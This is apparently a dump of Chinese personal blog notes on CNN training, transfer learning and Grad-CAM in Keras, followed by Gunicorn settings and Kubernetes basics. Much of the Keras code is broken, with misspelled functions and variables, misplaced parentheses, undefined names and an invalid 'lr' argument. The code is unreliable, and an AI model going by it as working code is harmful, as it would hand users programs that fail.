空间层次性：在某个层次学习到的模式，可以在下一个层次中进行组合，变成更大的模式；（可组合） 卷积运算过程 按一定大小的窗口，例如 3 * 3，对图片进行某个局部位置做卷积运算，得到一个有深度的输出结果；在深度维度上的每一个值，代表在这个小窗口中学习到的一个小特征；深度可以自定义； 平移小窗口，对整张图片进行卷积运算，就会得到由各种小特征组成的一个 3D 特征矩阵；矩阵的长宽分别代表一个窗口运算的结果，矩阵的深度则是该窗口的小特征集合； 接下来使用最大池化技术，对上一步获取的特征矩阵，进行采样；使用 2 * 2 窗口按步幅 2 进行采样，而卷积层是使用 3 * 3 窗口按步幅 1 进行计算； 总结来说就是两步，第一步是找特征，第二步是对特征进行采样（采集明显与众不同的那些特征）； 除了卷积计算外，还是一个反向卷积计算，叫 Deconvolution，也叫 transpose convolution；先使用正向卷积提取关键特征后，再用反向卷积可以提纯这些特征，去除最原始的噪声；在做反卷积计算时，由于输出比输入大，因此需要做一些 padding 的工作，然后才能够作常规的卷积核乘积计算； 反向卷积常用于图片分割任务，因为分割涉及像素级的操作，所以不能使用样本来代表整个图片，因此需要让最后的数据仍然保持和输入时一样，此时就可以先通过正向卷积获取关键特征，最后再通过反向卷积重新生成图片，用于分割；另外在 super-resolution，GAN，Surface depth estimation 任务中也会用到；可以说，凡是输出需要输入大的场景，都有可能会用到它； 用最大池化进行采样的目的 一是可以减少需要处理的特征图的元素的个数； 二是让观察窗口越来越大，覆盖原输入图的全部位置，从而可以学习到由局部图像组成的空间层次模式； 观察不同特征的最大值，而非平均值，更容易发现一些特征信息，因为特征通常是突出表现，与众不同的； 在小型数据集上从头开始训练一个卷积神经网络 卷积网络学习到的模式因为具有局部性和平移不变性的特点，相比其他网络模型，它可以在一个相对较小的数据集上学到较多的有用信息，取得还不错的效果； 如果要处理问题和数据比较大比较复杂，则应相应增加一些层数和单元数，以便有足够的容量存储学习到特征信息，避免欠拟合； Keras 有自带一个图像处理类，它能很好的完成图像处理的一些常见任务（以 python 生成器来实现）； 在较小的图片数据集上，可以使用数据增强（data augmentation）的技巧，来间接扩大数据集（它的本质上对图像做一些变形以生成新图片，例如旋转、翻转、缩放、拉伸等）；但是由于数据增强的数据来源仍是原始数据，所以部分数据是高度相关的，为避免产生过拟合，一般配合使用 dropout 层添加一些噪声来平衡； 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071# 下载图片，准备数据import os, shutil# 原始数据解压后的存放目标original_dataset_dir = &quot;/downloads/kaggle_original_data&quot;# 较小数据集的保存目录base_dir = &#x27;/downloads/cats_and_dogs_small&#x27;os.mkdir(base_dir)train_dir = os.path.join(base_dir, &quot;train&quot;)os.mkdir(train_dir)validation_dir = os.path.join(base_dir, &quot;validation&quot;)os.mkdir(validation_dir)test_dir = os.path.join(base_dir, &quot;test&quot;)os.mkdir(test_dir)train_cats_dir = os.path.join(train_dir, &quot;cats&quot;)os.mkdir(train_cats_dir)train_dogs_dir = os.path.join(train_dir, &quot;dogs&quot;)os.mkdir(train_dogs_dir)validation_cats_dir = os.path.join(validation_dir, &quot;cats&quot;)os.mkdir(validation_cats_dir)validation_dogs_dir = os.path.join(validation_dir, &quot;dogs&quot;)os.mkdir(validation_dogs_dir)test_cats_dir = os.path.join(test_dir, &quot;cats&quot;)os.mkdir(test_cats_dir)test_dogs_dir = os.path.join(test_dir, &quot;dogs&quot;)os.mkdir(test_dogs_dir)fnames = [&#x27;cat.&#123;&#125;.jpg&#x27;.format(i) for i in range(1000)]for fname in fnames: src = os.path.join(original_dataset_dir, fname) dst = os.path.join(train_cats_dir, fname) shutil.copyfile(src, dst)fnames = [&#x27;cat.&#123;&#125;.jpg&#x27;.format(i) for i in range(1000, 1500)]for fname in fnames: src = os.path.join(original_dataset_dir, fname) dst = os.path.join(validation_cats_dir, fname) shutil.copyfile(src, dst)fnames = [&#x27;cat.&#123;&#125;.jpg&#x27;.format(i) for i in range(1500, 2000)]for fname in fnames: src = os.path.join(original_dataset_dir, fname) dst = os.path.join(test_cats_dir, fname) shutil.copyfile(src, dst)fnames = [&#x27;dog.&#123;&#125;.jpg&#x27;.format(i) for i in range(1000)]for fname in fnames: src = os.path.join(original_dataset_dir, fname) dst = os.path.join(train_dogs_dir, fname) shutil.copyfile(src, dst)fnames = [&#x27;dog.&#123;&#125;.jpg&#x27;.format(i) for i in range(1000, 1500)]for fname in fnames: src = os.path.join(original_dataset_dir, fname) dst = os.path.join(validation_dogs_dir, fname) shutil.copyfile(src, dst)fnames = [&#x27;dog.&#123;&#125;.jpg&#x27;.format(i) for i in range(1500, 2000)]for fname in fnames: src = os.path.join(original_dataset_dir, fname) dst = os.path.join(test_dogs_dir, fname) shutil.copyfile(src, dst) 数据预处理123456789101112131415161718192021222324252627# 数据预处理# 读取图片，将图片转换为像素风格；将像素网络转换为浮点数张量；将像素值缩放到[0, 1] 之间；from keras.preprocessing.image import ImageDataGeneratortrain_data_gen = ImageDataGenerator(rescale=1./255)test_data_gen = ImageDataGenerator(rescale=1./255)# generator 表示生成器，它会在每次被调用时，生成并返回一份数据# 有点像迭代器，通常和 for...in... 配合使用# 生成器跟迭代器不同的地方在于，它没有终点，只要一直被调用，就会不断生成数据# 所以需要在某个时间点使用 break 进行终止train_data_generator = train_data_gen.flow_from_director( train_dir, target_size=(150, 150), batch_size=20, # 此处使用二进制类模式，原因在于问题本身是一个二元分类问题，后续计算时 # 将使用二元交叉熵作为损失函数 class_mode=&#x27;binary&#x27; )validation_data_generator = test_data_gen.flow_from_director( valication_dir, target_size=(150, 150), batch_size=20, class_mode=&#x27;binary&#x27; ) 构建网络1234567891011121314151617181920# 构建网络from tensorflow.keras import modelsfrom tensorflow.keras import layersmodel = model.Sequential()model.add(layers.Conv2D(32, (3, 3), activation=&quot;relu&quot;), input_shape=(150, 150, 3))model.add(layers.Maxpooling2D((2, 2)))model.add(layers.Conv2D(64, (3, 3), activation=&quot;relu&quot;))model.add(layers.Maxpooling2D((2, 2)))model.add(layers.Conv2D(128, (3, 3), activation=&#x27;relu&#x27;))model.add(layers.Maxpooling2D((2, 2)))model.add(layers.Conv2D(128, (3, 3), activation=&#x27;relu&#x27;))model.add(layers.Maxpooling2D((2, 2)))model.add(layers.Flatten())model.add(layers.Dense(512, activation=&#x27;relu&#x27;))model.add(layers.Dense(1, activation=&#x27;sigmoid&#x27;)) 开始训练123456789101112# 开始训练，此处使用了 fit_generator 方法，跟之前用的 fit 方法不同# 它的不同之处在于，它接受生成器作为参数，而不是 numpy 数组# history = model.fit_generator( train_generator, steps_per_epoch=100, epochs=30, validation_data=validation_generator, validation_steps=50)# 在训练完成后保存模型model.save(&quot;path/to/model.h5&quot;) 数据增强12345678910111213141516171819# 数据增强，可以通过对图片进行随机的变形，来增加训练的数据量# 通过在实例化 Image 数据生成器时，引入更多参数来实现# 之后通过这个实例化后的对象来处理图片时，会自动随机添加变形datagen = ImageDataGenerator( rotation_range=40, width_shift_range=0.2, height_shift_range=0.2, shear_range=0.2, zoom_range=0.2, horizontal_flip=True, fill_mode=&#x27;nearest&#x27;)# 为了尽可能避免过拟合，还有一种方法是在展平层之后，添加 dropout 层，引入一些随机的噪音# 强迫模型去学习噪音背后有用和真实存在的识别模式model.add(layers.Flatten())model.add(layers.Dropout(0.5))model.add(layers.Dense(512, activation=&#x27;relu&#x27;))model.add(layers.Dense(1, activation=&#x27;sigmoid&#x27;)) 使用预训练的卷积神经网络 深度学习的模型在本质天生具备高度的可复用性，这意味着，可以利用别人在大数据集上训练好的模型，做一些微调，来完成一些小数据集上面的任务；前提是该预训练的网络模型的原始数据集是足够大、足够通用的；而不是某种特定的任务； 12# 使用预训练的模型from keras.applications import VGG16 使用预训练网络的两种方法：特征提取、微调模型； 特征提取 一般来说，一个训练好的卷积神经网络包含两个部分，一个是由卷积层和池化层组成的卷积基，一个是密集连接层组成的分类器；除非问题完全相同，不然一般只复用卷积基，而不复用分类器，因为分类器是面向特定问题的； 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071# 实例化模型，获得其卷积基（通过将 include_top 设置为 false 来实现，表示不复用顶层的分类器）conv_base = VGG16( weights=&#x27;imagenet&#x27;, include_top=False, input_shape=(150, 150, 3))import osimport numpy as np from keras.preprocessing.image import ImageDataGenerator# 指定数据存储的目录base_dir = &#x27;/downloads/cats_and_dogs_small&#x27;train_dir = os.path.join(base_dir, &quot;train&quot;)validation_dir = os.path.join(base_dir, &quot;validation&quot;)test_dir = os.path.join(base_dir, &quot;test&quot;)# 此处实例化的数据生成器没有使用数据增强datagen = ImageDataGenerator(rescale=1./255)batch_size = 20# 将图片做为输入，利用已训练好的模型的卷积基，获得计算后的特征（即输出）def extract_features(directory, sample_count): features = np.zeros(shape=(sample_count, 4, 4, 512)) # 现在处理的是一个二元分类问题，所以 labels 只有一维 labels = np.zeros(shape=(sample_count)) generator = datagen.flow_from_directory( directory, target_size=(150, 150), batch_size=batch_size, class_mode=&#x27;binary&#x27; ) i = 0 for inputs_batch, labels_batch in generator: features_batch = conv_base.predict(inputs_batch) features[i * batch_size : (i + 1) * batch_size] = features_batch labels[i * batch_size : (i + 1) * batch_size] = labels_batch i += 1 if i * batch_size &gt;= sample_count: break return features, labels# 从目录中提取图片，用卷积基进行计算，将结果保存下来train_features, train_labels = extract_features(train_dir, 2000)validation_features, validation_labels = extract_features(validation_dir, 1000)test_features, test_labels = extract_features(test_dir, 1000)# 以上获得的特征的形状是 (sample, 4, 4, 512)，由于接下来要将这些# 特征做为密集层的输入，因此需要将它们展开成二维的train_features = np.reshape(train_features, (sample_count, (2000, 4 * 4 * 512)))validation_features = np.reshape(validation_features, (sample_count, (2000, 4 * 4 * 512)))test_features = np.reshape(test_features, (sample_count, (2000, 4 * 4 * 512)))# 接下根据自身的业务场景，添加自己的密集层进行训练model = models.Sequential()model.add(layers.Dense(256, activation=&#x27;relu&#x27;, input_dim=4 * 4 * 512))model.add(layers.Dropout(0.5))model.add(layers.Dense(1, activation=&quot;sigmoid&quot;))model.compile( optimizer=optimizers.RMSprop(1r=2e-5), loss=&#x27;binary_crossentropy&#x27;, metrics=[&quot;accuracy&quot;])history = model.fit( train_features, train_labels, epochs=30, batch_size=30, validation_data=(validation_features, validation_labels)) 如果特征提取想要使用数据增强（当样本数比较少时），则需要换一种方法：扩展卷积基； 这种方法的计算代价比较大，因为数据要流过整个卷积基，按模型训练的方式重新计算，而不是像前一种方法基于已有参数快速进行预测计算即可； 12345678# 扩展卷积基model = model.Sequential()# 在将卷积基加上模型前，需要先对其进行冻结，避免训练过程中改变了它们的参数conv_base.trainable = Falsemodel.add(conv_base)model.add(layers.Flatten())model.add(layers.Dense(256, activation=&#x27;relu&#x27;)model.add(layers.Dense(1, activation=&quot;sigmoid&quot;)) 微调模型 同时，对于卷积基，越靠近输入端的那几层，其提取的特征通用性越好；越靠近输出的层，则越是面向特定分类的模式组成，越是定向化，通用性降低；因此，虽然也可以解决全部层进行重新训练，但更靠底部的层，训练回报越少； 微调步骤 复用预训练网络的整个卷积基，添加自己的分类器到模型中； 冻结卷积基，对分类器进行训练； 解冻顶部的一个卷积块，联合训练解决冻这些层和分类器； 12345678910111213141516171819# 微调模型，解冻顶部的少数层# 先将整个卷积基的 trainable 属性设置为 Trueconv_base.trainable = True # 指定将某个层的 trainable 属性设置为 True，其他仍为 Fasleset_trainable = False for layer in conv_base.layers: if layer.name == &#x27;block5_conv1&#x27;: set_trainable = True if set_trainable: layer.trainable = True else: layer.trainable = False# 使用非常小的学习率开始训练模型model.compile( optimizer=optimizers.RMSprop(lr=1e-5), loss=&quot;binary_crossentropy&quot;, metrics=[&quot;accuracy&quot;]) 卷积神经网络的可视化网络模型本质上是由层组成的，而每一层实际上又由多个过滤器组成；而过滤器本质上是一个有着特定参数的函数，它对输入数据进行计算，得到一个输出结果；该输出结果做出下一层的输入数据； 可视化网络模型，本质是就是可视化这些过滤器函数的功能；有三种观察它的方式： 一种是给定输入，看它的输出（可视化中间激活） 一种是看该函数得到最大值时的输入（可视化过滤器） 一种是看涉及分类决策在原输入图中的部位（可视化类激活图） 可视化中间激活 层的输出一般称为激活（原因：层的输出即为激活函数的输出） 随着层数的增加，模型不断对输入图像进行特征提取并进行组合，因此，到了越高的层级，特征变得越来越抽象，越无法直观理解，但是与目标类别需的信息越来越接近； 实现方法： 获取已训练好的模型的各层输出，组成一个输出列表 创建一个新的模型实例，该实现以已训练好的模型的输入和输出列表为参数； 用新模型对一张图片进行预测，得到输出结果列表； 为每一层输出的每一个通道生成一张图像（为了让图片美观，此处会对数值进行标准化处理） 可视化卷积神经网络的过滤器根据过滤器的参数，反向来计算让参数获得最大值的输入，从而知悉过滤器对什么样的模式产生响应； 实现方法： 从模型中获取某一层的输出； 使用 backend.mean 函数，计算该层输出的损失值； 使用 backend.gradients 函数，计算损失相对模型原始输入的梯度； 对梯度进行标准化（这样可以比较不同输入图像之间的计算结果）； 定义后端函数，它可以将输入的张量，转换为损失值张量和梯度值张量； 初始化一张灰度图，并随机加入一些噪声； 使用该灰度图做为初始输入值，用刚定义的后端函数进行计算损失值和梯度值张量； 将梯度值添加到灰度图中，再重复上一个步骤，循环多次（例如40次），最后将得到一系列图像，该系列图像可最大化的激活对应通道的过滤器 可视化图像中类激活的热力图图像上的不同部分，对最终分类决策重要程度不同，有些部分强相关，有些部分弱相关；假设已知输入图像对不同通道的激活强度，再加上每个通道对分类决策的重要程度，我们就可以求得输入图像的不同部分对分类决策的不同重要程度； 实现方法12345678910111213141516171819202122232425262728293031323334# 选定一张待分类的图片，先进行预处理，以便可以做为模型的输入数据 x = preprocess_input(image)；# 使用模型对图片进行预测分类，得到分类结果的输出；该输出是一个向量，由于每种类别的概率组成 preds = model.predict(x)；# 找到最大概率类型所在的下标 index = np.argmax(preds[0])# 根据该下标，在模型预测向量中取得输入图像的相关输出 image_output = model.output(:, index)；# 从模型中取出最后一个卷积层 last_conv_layer = model.get_layer(layer_name)；# 计算图像的最终输出与最后一个卷积层的梯度 grads = K.gradients(image_output, last_conv_layer.ouput)[0]# 计算梯度中每个通道的平均值 pooled_grads = K.mean(grads, axis=(0, 1, 2))# 定义后端函数，它接受一个输入，给出 pooled_grads 和 last_conv_layer 的输出特征图iterate = K.function([model.input], [pooled_grads, last_conv_layer.output[0])# 计算输入的测试图像 x 的 pooled_grads_value 和 conv_layer_output_valuepooled_grads_value, conv_layer_output_value = iterate([x])# 将特征数据的每个通道，乘以该通道对大象类型的重要程度for i in range(512): conv_layer_output_value[:, :, i] *= pooled_grads_value[i]# 上一步得到的特征图，对每个通道求平均值，即可得到热力图heatmap = np.mean(conv_layer_output_value, axis=-1)# 为了方便查看，将热力图标准化处理heatmap = np.maxmium(heatmap, 0)heatmap /= np.max(heatmap)# 将热力图叠加到原始图片上import cv2img = cv2.imread(img_path)heatmap = cv2.resize(heatmap, img.shape[1], img.shape[0])heatmap = np.uint8(255 * heatmap)heatmap = cv2.applyColorMap(heatmap, cv2.COLORMAP_JET)superimposed_img = heatmap * 0.4 + imgcv2.imwrite(superimposed_img_path, superimposed_img)","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"深度学习","slug":"深度学习","permalink":"http://example.com/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"}]},{"title":"Gunicorn","slug":"Gnicorn","date":"2020-08-19T02:38:00.000Z","updated":"2024-09-21T04:09:12.970Z","comments":true,"path":"2020/08/19/Gnicorn/","permalink":"http://example.com/2020/08/19/Gnicorn/","excerpt":"","text":"在编写好 python 的 web 程序后，可使用 Gunicorn 进行部署，以便快速实现并发目标，避免重复造轮子； 运行使用命令1gunicorn [OPTIONS] [WSGI_APP] WSGI_APP 的完整格式为：$(MODULE_NAME):$(VARIABLE_NAME) MODULE_NAME 指待载入运行的文件或模块名称；可以是一个相对路径； VARIABLE_NAME 指文件中的指向 WSGI 接口的变量名称；例如 app &#x3D; Flask() 中的 app；也可以是一个返回 app 的函数调用；例如：”app:create_app()” 如果已经在配置文件中指定了 WSGI_APP，则命令行中的此参数是可选的； 常用参数-c 指定配置文件的路径 -b 绑定的 socket，格式可以为 $(HOST), $(HOST):$(PORT), fd:&#x2F;&#x2F;$(FD), unix:$(PATH), $(IP_ADDRESS) 配置Gunicorn 会从五个地方读取配置信息 环境变量； Web 框架中的特定配置文件； 指定目录下（默认当前目录）的 gunicorn.conf.py 文件（会覆盖框架配置文件的值） 通过命令行参数传递给环境变量 GUNICORN_CMD_ARGS 的值； 命令行参数； 命令行命令行参数的优先级最高，它会覆盖其他方式的配置信息；但不是所有配置项都可以使用命令行进行设置； 配置文件配置文件需要是以 .py 为后缀的 python 文件；它可以是只读的；设置配置项时，只需要在文件中定义相应的变量名称并赋值即可； 12bind = &quot;127.0.0.1:8000&quot;workers = 2","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"Kubernetes 实战","slug":"Kubernetes 实战","date":"2020-08-12T01:25:00.000Z","updated":"2024-09-21T10:34:59.208Z","comments":true,"path":"2020/08/12/Kubernetes 实战/","permalink":"http://example.com/2020/08/12/Kubernetes%20%E5%AE%9E%E6%88%98/","excerpt":"","text":"1. Kubernetes 系统的需求实现硬件资源的管理和应用执行环境管理二者的分离，即开发人员和运维人员不再需要有交集，而只需专注自己的那一部分工作； 介绍容器技术Linux 从内核层面实现的隔离技术，包括进程命名空间和 cgroup 资源隔离两种机制； 优点：同样实现隔离功能，容器技术相对重量级的 VM 虚拟机机制，更加轻量化，相同的硬件资源，可以更大效率的利用； 缺点：由于不同容器共用主机的内核，因此当容器环境对内核有特定要求时，会降低容器的可移植性； Kubernetes 介绍Kubernetes 对硬件资源进行了抽象，部署应用程序时，不用再关心需要使用哪些硬件资源；所有资源都被抽象成单个大节点；不管集群中包含多少节点，集群规模都不会造成差异性，额外的集群节点只是代表一些额外的可用来部署应用的资源； 在开发者眼中，Kubernetes 可以被视为关于集群的一个操作系统，因此只需专注实现应用本身，而无须关心应用与基础设施如何集成； Kubernetes 集群结构 主节点 scheduler：负责调度，为应用分配节点； controler manager；负责管理集群； etcd：负责存储，持久化存储集群的配置信息； API 服务器：负责各个组件之间的通讯； 工作节点 容器运行时：即 Docker 或 rtk等； Kubelet：负责与 API 服务器通信，并管理当前节点内的容器； Kube-proxy：负责网络流量的负载均衡； 在 Kubernetes 中运行应用应用转描述 将应用打包成镜像； 将镜像推送到仓库； 将应用的描述发布到 Kubernetes API 服务器； 描述转容器调度器根据描述文件中每组所需的计算资源，以及每个节点当前未分配的资源，调度指定的组到可用的工作节点上； 节点收到调度器指派的组后，从仓库拉取镜像并运行容器； 保持容器运行对运行中的容器和工作节点进行监控，如果容器退出则重新创建；若工作节点宕机，则分配相应组到新的工作节点； 扩展副本数量副本数量可以手工进行增加或减少，也可以交给 Kubernetes 自行调整为最佳副本数； 命中移动目标由于容器是动态调度的，这意味着它们会移动；因此 Kubernetes 通过提供服务的静态 IP 或 DNS 服务查找 IP 两种方式，来对外提供稳定的服务； 使用 Kubernetes 的好处在任何部署了 Kubernetes 的机器上，系统管理员不再需要安装任何东西来部署和运行应用程序；而开发人员也将不需要系统管理员的任何帮助，即可以立即运行应用程序； 简化应用程序部署：所有的工作节点被抽象成一个部署平台；对于异构节点，只需在描述中增加对应用程序所需资源的选择条件即可； 更好的利用硬件：当硬件资源很多时，人工找到最佳组合的难度会变得很大； 健康检查和自修复：通过自动监控，当出现故障时，可以将应用程序迁移到备用资源上；运维人员无需立即做出反应，可以等到上班时间再排查故障即可； 自动扩容：自动根据应用程序的荷载，放大或缩小集群的规模； 简化开发人员的部署：无须系统管理员的帮助即可实现部署；同时方便 BUG 排查，在部署出错时可以停止更新自动回滚； 2. 开始使用 Kubernetes 和 Docker创建、运行和推送镜像（略） 配置 Kubernetes 集群有多种方法可以安装 Kubernetes 集群，包括： 本地的开发机器； 自己组织的机器； 虚拟机提供商的机器； 托管的集群； 由于集群的配置工作比较复杂，因此使用较多的是第1和第4种，即本地和托管两种；另外两种需要使用 kubeadm 或 kops 工具来实现； 在 Kubernetes 上运行应用最简单的方式是使用 run 命令，但常规的方式是使用 YAML 或 JSON 描述文件； pod 很像一个独立的逻辑机器，拥有自己的 IP、主机名、进程等；因此，pod 内的容器总是运行在同一个工作节点上； 每个 pod 都有自己的 IP，但这个 IP 是集群内使用的，不能被外部访问，需要通过创建服务来公开它； loadBalancer 类型的服务，会创建一个可以公开访问的公网 IP，因此它需要使用托管的集群才能实现这点，本地运行的 minikube 做不到； 服务与 pod 的关系 之所以需要服务这个抽象层，其原因在于 pod 的生命周期是短暂的，它有可能因为各种意外的场景消失了，而重新创建的 pod 会有不一样的 IP 地址；因此，需要有一个能够提供静态 IP 访问地址的服务层，并由这个服务层将访问请求路由到当前正常工作的 pod 中； 3. pod：运行于 Kubernetes 中的容器pod 是 kubernetes 中最核心的概念，而其他组件仅仅是管理或暴露它，或者被它所使用； 介绍 pod每个容器只运行一个单独的进程是一种好的 docker 实践（除非是该进程自行产生的子进程）； 为什么多容器协作优于单容器多进程的协作？ 多进程之间需要解释依赖冲突的问题； 当某个进程崩溃需要重启时，多进程场景增加了复杂度； 为何需要 podKubernetes 通过配置 docker 让一个 pod 内的所有容器共享相同的 Linux 命令空间，而不是每个容器都有自己的一组命名空间；这种做法可以让容器之间很方便的实现资源共享，包括 IP 地址、端口空间、主机名、IPC命名空间等；但不共享文件系统，而是通过 docker 的 volume 机制来实现数据的共享； 一个 pod 中的所有容器具有相同的 loopback 网络接口，因此容器之间可以通过 localhost 与同一个 pod 中的其他容器进行通信； 集群中的所有 pod 都在同一个网络地址空间中，这意味着每个 pod 都可以使用其他 pod 的 IP 地址，与该 pod 直接进行通信，而无须 NAT 网络地址转换； 总结：pod 就像一台逻辑主机，其行为和物理主机或虚拟主机非常相似，区别在于运行于 pod 当中的每个进程被封装在一个容器之中； 通过 pod 合理管理容器将多层应用分散到多个 pod 中是一种更好的实践，这样可以更充分的利用集群中的节点的计算资源，因为单个 pod 只会被安装在一个工作节点上；并且这样也方便更细粒度的对应用进行扩容； 何时在一个 pod 中使用多个容器？仅当其他容器是做为主容器的辅助身份出现时，例如提供日志转换器和收集器、数据处理器、通信适配器等； 做决定前待思考的问题 它们需要一起运行，还是可以在不同的主机上运行？ 它们代表的是一个整体，还是相互独立的组件？ 它们必须一起进行扩缩容还是可以分别进行？ 以 YAML 或 JSON 描述文件创建 podYAML 的基本结构组成 版本 类型 元信息 规格 在 pod 定义中指定端口仅起到展示性的作用，以便让看到这个文件的人知道当前 pod 有哪些端口可以被访问，即使不写，也仍然可以访问；另外一个好处是可以给该端口指定名称，这样使用起来将更加方便； 常用命令kubectl get pod -o yaml查看容器的描述，支持 yaml 和 json 两种格式 kubectl create -f 按 yaml 文件创建相应的资源； 好奇 create 和 apply 有什么区别？答：使用 apply 创建的资源，后果可以再次使用 apply 来检查声明文件是否存在更新，如果有更新，会自动删除旧资源，并创建新资源； kubectl logs 查看 pod 的日志； 当日志文件达到 10MB 大小时，日志会自动轮替； kubectl logs -c 获取 pod 中某个容器的日志； 默认情况下，日志的生命周期和 pod 绑定，即 pod 删除后，日志也消失了；如果想保留日志，则需要另外建立一个中心化的日志系统来存储日志； 向 pod 发送请求kubectl port-forwad kubia-manual 8888:8080在不使用 service 的情况下，port-forwad 可将本地端口转发到 pod 中的某个端口 使用标签组织 pod标签不仅可以用来组织 pod，也可以用来组织其他的 kubernetes 资源； 创建资源时，可以附加标签；创建之后，仍然可以添加标签或修改标签； 通过标签，可以非常方便的对资源进行分类管理；也可以实现批量化操作； 添加或修改标签kubectl label po &#x3D;新增标签 kubectl label po &#x3D; –overwrite通过 –overwrite 选项更改旧标签 通过标签选择器列出 pod 子集标签选择器的选择条件 包含（或不包含）特定键； 包含特定的键值对； 包含特定键，但值不同； 标签选择器支持多个条件，此时需要满足全部条件才算匹配成功； 使用标签和选择器来约束 pod 调度当节点是同质的时候，无须显式的声明 pod 应该被调度的位置；但当节点是异质的时候，如果应用程序对硬件有要求，则需要使用需求描述，来告知 kubernetes 对调度的要求（但仍然不是显式指定节点，而是由 kubernetes 自行安排），例如设置标签做为过滤的条件 label gpu&#x3D;true； 1234567891011# 示例apiVersion: v1kind: Podmetadata: name: kubia-gpuspec: nodeSelector: gpu: &quot;true&quot; containers: - image: luksa/kubia name: kubia 虽然也可以将 pod 调度到某个确定的节点（通过节点唯一标签实现，即 kubernetes.io&#x2F;hostname），但是这样风险很大，因为有可能该节点刚好处于不可用状态，这样会导致部署不成功；所以，最好的方式是使用标签选择器； 注解 pod注解也是一个类似标签的键值对的形式，但是它不能用于选择器，它的用途在于给对象添加更多说明性的信息，方便其他人了解对象的一些重要信息； 除了手动添加注解后，Kubernetes 本身也会根据需要，自动给对象添加一些注解； 注解信息存储于对象 metadata 下的 annotations 字段中； 添加和修改注解kubectl annotate pod kubia-manual mycompany.com&#x2F;somea nnotation&#x3D;”foo bar”使用“mycompany.com&#x2F;someannotation”这种格式的目的在于尽量减少冲突，避免不小心覆盖的可能性 使用命名空间对资源进行分组通过标签来分组，存在的问题是不同标签之间的对象可能会有重叠，如果想实现不重叠，则可以通过命名空间来进行分组；这样可以解决资源名称冲突、不同用户误删除其他用户资源的问题；同时还可以限制某些用户仅可访问某些资源、限制单个用户可用的计算资源数量等； 命名空间是比资源更高一个层级的抽象，所以对象都默认属于某个命名空间中；如果没有特意指明哪个命名空间，一般是在 default 命名空间中操作对象；命名空间相当于给资源名称提供了一个作用域； 当需要操作某个特定命名空间中的对象时，需要在命令中指定相应的命名空间名称； 创建一个命名空间有两种创建方法： 直接通过 create 命令创建，示例： kubectl create namespace 通过 YAML 描述文件创建； 领悟：在 kubernetes 中，所有东西其实都是对象，都可以使用 YAML 文件来描述对象的一些属性特征，然后通过 create 命令创建该对象； 管理命名空间中的资源当命名空间创建好了以后，如果要将某个对象放入该空间，也有两种方法： 在 create 命令中通过 -n 选项指定空间名，示例：kubectl create -f -n 在 YAML 文件中的 metadata 下的字段 namespace 指定所属的命名空间 在对命名空间中的对象进行增删改查操作时，需要指定相应的命名空间名称，否则将默认操作当前上下文命名空间中的资源（默认是 default ，但可以通过 kubectl config 对当前上下文进行修改）； 注：命名空间仅仅是一种逻辑上的资源分组，它并不提供资源之间的物理隔离，因此不同命名空间的对象之间，如果知道对方的 IP 地址，仍然是可以相互通信的； 停止和移除 pod按名称删除 podkubectl delete po 使用标签选择器删除 podkubectl delete po -l &#x3D;通过删除整个命名空间来删除 podkubectl delete ns 该命名将删除整个命名空间，以及里面的 pod 删除命名空间中的 pod，但保留命名空间kubectl delete po –all–all 选项确实会删除当前运行中的所有 pod，但问题是如果控制器没有停止运行的话，它将根据描述文件的描述，重新创建 pod 出来； 删除命名空间中的（几乎）所有资源kubectl delete all –all4. 副本机制和其他控制器：部署托管的 podpod 是最小的单元，它需要被部署到节点上，而这意味着当节点失败时，pod 也将被删除；因此需要引入一种机制，当发现节点失败时，会在新节点上面部署 pod，这样才可以确保 pod 随时健康运行；一般通过 ReplicationController 或 Deployment 来实现这一点； 保持 pod 健康应用存在于容器之中，如果是容器挂了，K8s 会重启容器，但如果是应用程序挂了而容器还正常运行时，就需要引入一种监控机制，来重启应用程序了； 介绍存活探针存活探针：liveness probe，用来探测应用程序是否在正常运行中，如果探测失败，就会重启容器； 另外还有一种就绪探针，readiness probe，它适用于不同的场景； 三种类型的探针： HTTP GET 探针：向应用发送 GET 请求，像是否收到正确的响应码； TCP 套接字探针：与容器中的指定端口建立连接，像是否能够连接成功； Exec 探针：在容器内运行指定的命令，看退出状态码是否为 0（表示正常），非零表示失败； 创建基于 HTTP 的存活探针 使用存活探针 logs 命令是查看当前 pod 的日志，如果加上 –previous 选项，则可以查看之前 pod 的日志 当探针检查到容器不健康后，K8s 会删除旧的容器，创建新容器，而不是重启原来的容器； 配置存活探针的附加属性设置首次探测等待时间 如果不设置初始等待时间，则将在启动时马上探测容器，这样通常会导致失败； 创建有效的存活探针存活探针应该检查什么存活探针的作用在于确保应用程序健康工作，因此可以在应用程序中增加一个 API，当正常工作时，访问该 API 可以运行相应的代码，检查各项组件正常工作，之后返回一个正确的代号； 保持探针轻量探针本身是会消耗计算资源的，而且由于它的运行频率也比较高，因此非常有必要保证它是轻量的，一般可以使用 HTTP GET 探针； 无须在探针中实现重试循环虽然探针的失败阈值是可以配置的，但是貌似没有必要； 了解 ReplicationControllerReplicationController 副本管理器；pod 运行在节点中，只有当 pod 被 ReplicationController 管理时，pod 才会在节点故障消失后马上被重建； ReplicationController 通过标签选择器来判断符合条件的 pod 数量是否与预期相符； ReplicationController 的操作ReplicationController 有三个组件，分别是标签选择器、副本数量、pod 模板；当更改副本数量时，会影响现有的 pod；当更改标签选择器和模板时，会使现在的 pod 脱离监控；ReplicationController 将不再关注这些 pod； 创建一个 ReplicationController 如果不指定选择器，则 K8S 会以模板里面的标签自动作为选择器的内容，这样更安全，避免因为不小心写错选择器，导致无休止的一直创建 pod； 使用 ReplicationController查看 rc 的状态 将 pod 移入或移出 ReplicationController 的作用域ReplicationController 与 pod 之间其实没有任何的绑定管理，它们纯粹是通过标签选择器联系在一起的，因此只需要改变 rc 的标签选择器，或者改变 pod 的标签，它们就会建立或者断开联系； 如果改动了 pod 的标签，它与原来的 rc 失去联系，rc 会发现少了一个家伙，之后 rc 会重新创建一个 pod； 如果改动了 rc 的标签选择器，将导致现有的 pod 全部脱离联系，并且会生成三个新的 pod； 修改 pod 模板rc 的 pod 模板也可以被修改，但是修改之后并不会影响当前正在运行的 